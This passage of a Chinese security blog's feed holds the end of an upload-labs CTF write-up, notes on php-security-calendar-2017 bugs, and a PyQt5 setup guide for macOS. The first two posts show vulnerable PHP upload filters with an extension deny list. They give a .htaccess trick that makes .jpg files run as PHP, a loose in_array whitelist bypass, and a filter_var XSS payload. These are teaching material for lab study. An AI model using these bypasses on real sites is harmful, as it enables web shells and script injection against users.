class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先上传一个<code>.htaccess</code>文件，内容如下，这里的含义就是把jpg文件当作php解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>然后我们上传<code>1.jpg</code>，内容如下，然后访问即可，如果无法解析，那么就是本地没有开启apache服务</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;upload-labs解题记录&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>php-security-calendar-2017漏洞分析笔记</title>
    <link href="http://0clickjacking0.github.io/2019/11/27/php-security-calendar-2017%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0/"/>
    <id>http://0clickjacking0.github.io/2019/11/27/php-security-calendar-2017漏洞分析笔记/</id>
    <published>2019-11-27T11:56:14.000Z</published>
    <updated>2019-11-30T07:33:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>php-security-calendar-2017漏洞分析笔记</p><a id="more"></a><h2 id="Day-1-Wish-List"><a href="#Day-1-Wish-List" class="headerlink" title="Day 1 - Wish List"></a>Day 1 - Wish List</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> UPLOAD_DIRECTORY = <span class="string">'./solutions/'</span>;</span><br><span class="line">  <span class="keyword">private</span> $file;</span><br><span class="line">  <span class="keyword">private</span> $whitelist;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>], <span class="keyword">$this</span>-&gt;whitelist)) &#123;</span><br><span class="line">      move_uploaded_file(</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file[<span class="string">'tmp_name'</span>],</span><br><span class="line">        <span class="keyword">self</span>::UPLOAD_DIRECTORY . <span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>]</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = <span class="keyword">new</span> Challenge($_FILES[<span class="string">'solution'</span>]);</span><br></pre></td></tr></table></figure><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>任意文件上传</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在第12行代码中，因为in_array没有设置<code>strict</code>比较，则默认使用宽松比较，具体可参考<a href="https://www.php.net/manual/zh/function.in-array.php" target="_blank" rel="noopener">官方手册</a>,所以虽然设置了白名单，但还是可以进行任意文件上传。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">$file_name = <span class="string">'1a.php'</span>;</span><br><span class="line">var_dump(in_array($file_name, $whitelist));</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line">bool(<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure><h2 id="Day-2-Twig"><a href="#Day-2-Twig" class="headerlink" title="Day 2 - Twig"></a>Day 2 - Twig</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// composer require "twig/twig"</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $twig;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $indexTemplate = <span class="string">'&lt;img '</span> .</span><br><span class="line">      <span class="string">'src="https://loremflickr.com/320/240"&gt;'</span> .</span><br><span class="line">      <span class="string">'&lt;a href="&#123;&#123;link|escape&#125;&#125;"&gt;Next slide &amp;raquo;&lt;/a&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default twig setup, simulate loading</span></span><br><span class="line">    <span class="comment">// index.html file from disk</span></span><br><span class="line">    $loader = <span class="keyword">new</span> Twig\Loader\ArrayLoader([</span><br><span class="line">      <span class="string">'index.html'</span> =&gt; $indexTemplate</span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;twig = <span class="keyword">new</span> Twig\Environment($loader);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNexSlideUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $nextSlide = $_GET[<span class="string">'nextSlide'</span>];</span><br><span class="line">    <span class="keyword">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twig-&gt;render(</span><br><span class="line">      <span class="string">'index.html'</span>,</span><br><span class="line">      [<span class="string">'link'</span> =&gt; <span class="keyword">$this</span>-&gt;getNexSlideUrl()]</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Template())-&gt;render();</span><br></pre></td></tr></table></figure><h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>xss</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>第10行代码经过渲染之后可以防止被标签闭合，第22行<code>filter_var($nextSlide, FILTER_VALIDATE_URL)</code>是验证url的函数，只需要构造<code>a://b</code>即可，然后在<code>&lt;a href=&#39;&#39;&gt;&lt;/a&gt;</code>里面可以用<code>javascript:</code>伪协议进行js代码的执行，参考<a href="https://www.cnblogs.com/song-song/p/5277838.html" target="_blank" rel="noopener">A标签使用javascript:伪协议</a>。因为nextSlide是通过GET请求接收的，那么构造<code>javascript://123%0aalert(1)</code>，这里的<code>//</code>对于<code>filter_var</code>函数来说是协议，但是对于js来说是注释，这样可以巧妙的绕过<code>filter_var</code>函数并且成功执行js代码。因为<code>&lt;a href=&#39;&#39;&gt;&lt;/a&gt;</code>里面跳转的链接是跳转到浏览器，所以对<code>%0a</code>再次进行url编码，所以构造<code>javascript://123%250aalert(1)</code></p><h3 id="Day-3-Snow-Flake"><a href="#Day-3-Snow-Flake" class="headerlink" title="Day 3 - Snow Flake"></a>Day 3 - Snow Flake</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">include</span> $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName = $_GET[<span class="string">'c'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'d'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (class_exists($controllerName)) &#123;</span><br><span class="line">  $controller = <span class="keyword">new</span> $controllerName($data[<span class="string">'t'</span>], $data[<span class="string">'v'</span>]);</span><br><span class="line">  $controller-&gt;render();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'There is no page with this name'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $template;</span><br><span class="line">  <span class="keyword">private</span> $variables;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($template, $variables)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;template = $template;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;variables = $variables;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;variables[<span class="string">'new'</span>]) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'controller rendering new response'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'controller rendering old response'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞-2"><a href="#漏洞-2" class="headerlink" title="漏洞"></a>漏洞</h3><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php-security-calendar-2017漏洞分析笔记&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>Mac下pycharm + python3.7 + PyQt5 + Qt5.13.1配置</title>
    <link href="http://0clickjacking0.github.io/2019/10/30/Mac%E4%B8%8Bpycharm-python3-7-PyQt5-Qt5-13-1%E9%85%8D%E7%BD%AE/"/>
    <id>http://0clickjacking0.github.io/2019/10/30/Mac下pycharm-python3-7-PyQt5-Qt5-13-1配置/</id>
    <published>2019-10-30T01:27:22.000Z</published>
    <updated>2019-11-13T03:47:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>Mac下pycharm + python3.7 + PyQt5 + Qt5.13.1配置</p><a id="more"></a><h1 id="初始环境："><a href="#初始环境：" class="headerlink" title="初始环境："></a>初始环境：</h1><p>mac: 10.13.6</p><p>pycharm: 2018.2.8</p><p>python: 3.7</p><p>pip: 10.0.1</p><h1 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h1><h2 id="安装pyqt5"><a href="#安装pyqt5" class="headerlink" title="安装pyqt5"></a>安装pyqt5</h2><p>执行下面两条语句进行安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip3 install PyQt5</span><br><span class="line"></span><br><span class="line">pip3 install PyQt5-sip</span><br></pre></td></tr></table></figure><h2 id="安装sip"><a href="#安装sip" class="headerlink" title="安装sip"></a>安装sip</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install sip</span><br></pre></td></tr></table></figure><h2 id="安装qt"><a href="#安装qt" class="headerlink" title="安装qt"></a>安装qt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install qt</span><br></pre></td></tr></table></figure><h1 id="配置PyCharm"><a href="#配置PyCharm" class="headerlink" title="配置PyCharm"></a>配置PyCharm</h1><h2 id="切换到Python3-x环境"><a href="#切换到Python3-x环境" class="headerlink" title="切换到Python3.x环境"></a>切换到<code>Python3.x</code>环境</h2><p>因为我默认就是<code>3.x</code></p><p><img src="http://images.xianyu123.club/python3_env.png" alt></p><h2 id="配置GUI设计工具"><a href="#配置GUI设计工具" class="headerlink" title="配置GUI设计工具"></a>配置GUI设计工具</h2><p>点击<code>➕</code>进行添加</p><p><img src="http://images.xianyu123.club/qt1.png" alt></p><h3 id="添加Qt-Designer"><a href="#添加Qt-Designer" class="headerlink" title="添加Qt Designer"></a>添加Qt Designer</h3><p>然后填写下面的信息即可（因为我是用homebrew安装qt的，所以路径可能有点不一样，各位看仔细了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name----Qt Designer</span><br><span class="line"></span><br><span class="line">Program----/usr/local/Cellar/qt/5.13.0/libexec/Designer.app</span><br><span class="line"></span><br><span class="line">Arguments----这个不需要填写</span><br><span class="line"></span><br><span class="line">Working dirctory----/usr/local/Cellar/qt/5.13.0/libexec</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/qt2.png" alt></p><h3 id="添加PyUIC"><a href="#添加PyUIC" class="headerlink" title="添加PyUIC"></a>添加PyUIC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name----PyUIC</span><br><span class="line"></span><br><span class="line">Program----/Library/Frameworks/Python.framework/Versions/3.7/bin/pyuic5</span><br><span class="line"></span><br><span class="line">Arguments----$FileName$ -o $FileNameWithoutExtension$.py</span><br><span class="line"></span><br><span class="line">Working dirctory----$FileDir$</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/qt3.png" alt></p><h3 id="验证是否成功添加"><a href="#验证是否成功添加" class="headerlink" title="验证是否成功添加"></a>验证是否成功添加</h3><p>点击tools-external tools</p><p><img src="http://images.xianyu123.club/qt4.png" alt></p><p>如果有下面这种显示的话，就代表成功了</p><p><img src="http://images.xianyu123.club/qt5.png" alt></p><p>然后我们随便创建一个<code>ui</code>文件，然后点击ui文件，右键使用我们刚才添加的external tools中PyUIC，如果能成功导出，则说明成功了</p><p><img src="http://images.xianyu123.club/qt6.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Mac下pycharm + python3.7 + PyQt5 + Qt5.13.1配置&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="http://0clickjacking0.github.io/categories/Python/"/>
    
    
  </entry>
  
</feed>
